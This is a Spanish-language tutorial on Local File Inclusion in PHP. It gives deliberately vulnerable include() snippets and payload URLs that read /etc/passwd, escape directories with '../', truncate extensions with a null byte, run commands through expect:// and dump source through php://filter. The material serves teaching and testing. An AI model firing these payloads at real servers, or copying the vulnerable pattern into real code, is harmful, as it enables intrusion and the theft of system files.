---
title: Local File Inclusion (LFI)
published: true
---

La vulnerabilidad 'Local File Inclusion', 'LFI' por sus siglas en inglés, permite a un atacante leer archivos del servidor vulnerable. Esta afección se produce debido a malas prácticas durante la programación de una página web. 

Dependiendo de la gravedad, esta vulnerabilidad puede llevar al atacante a:
	
* RCE (Remote Code Execution)
* XSS (Cross-Site Scripting)
* DoS (Denial Of Service)

Un ejemplo muy básico sería el siguiente script de PHP:

```php
<?php
	$file = $_GET['filename'];
	include($file);
?>
```

Donde podemos leer cualquier archivo del sistema, en este caso el '/etc/passwd'

```
https://localhost/lfi.php?filename=/etc/passwd
```

Es importante aclarar que esta no es solo una vulnerabilidad de PHP, también está presente en otros lenguajes como lo es JSP o ASP.

### [](#header-3)Directory Path Traversal

Es posible que en el código se nos limite a acceder a archivos que se ubican únicamente en la ruta establecida, en este caso '/var/www/html/'.

```php
<?php
	$file = $_GET['filename'];
	include("/var/www/html/" . $file);
?>
```

Sin embargo, podemos "escaparnos" de la ruta establecida si añadimos '../', pudiendo así listar contenido más allá de '/var/www/html/'.

```
https://localhost/lfi.php?filename=../../../etc/passwd
```

### [](#header-3)Null Byte

De igual manera, es posible que en el código se nos limite a acceder a archivos con únicamente de la extensión establecida, en este caso 'PHP'.

```php
<?php
	$file = $_GET['filename'];
        require($file . ".php");
?>
```

De modo que cuando intentemos leer el archivo '/etc/passwd', o cualquier otro archivo, lo que estariamos leyendo en realidad sería el archivo '/etc/passwd.php', el cual no existe. Sin embargo, si añadimos el nullbyte `(%00)` al final de nuestra cadena de ataque, el '.php' no será tenido en cuenta. 

```
https://localhost/lfi.php?filename=/etc/passwd%00
```

### [](#header-3)Wrappers

PHP cuenta con una serie de "wrappers", los cuales a menudo pueden ser abusados, por mencionar algunos tenemos:

#### [](#header-4)expect://

Nos permite una ejecución remota de comandos (RCE).

```
https://localhost/lfi.php?filename=expect://whoami
```

#### [](#header-4)filter://

Nos permite codificar archivos del sistema a través de diferentes métodos como podría ser Base64 o ROT13. 
Es bastante útil si necesitamos leer un archivo en PHP, ya que recordemos, este es un lenguaje interpretado, por lo que si intentamos leer un archivo PHP, no veríamos nada.

```
https://localhost/lfi.php?filename=php://filter/convert.base64-encode/resource=test.php
```
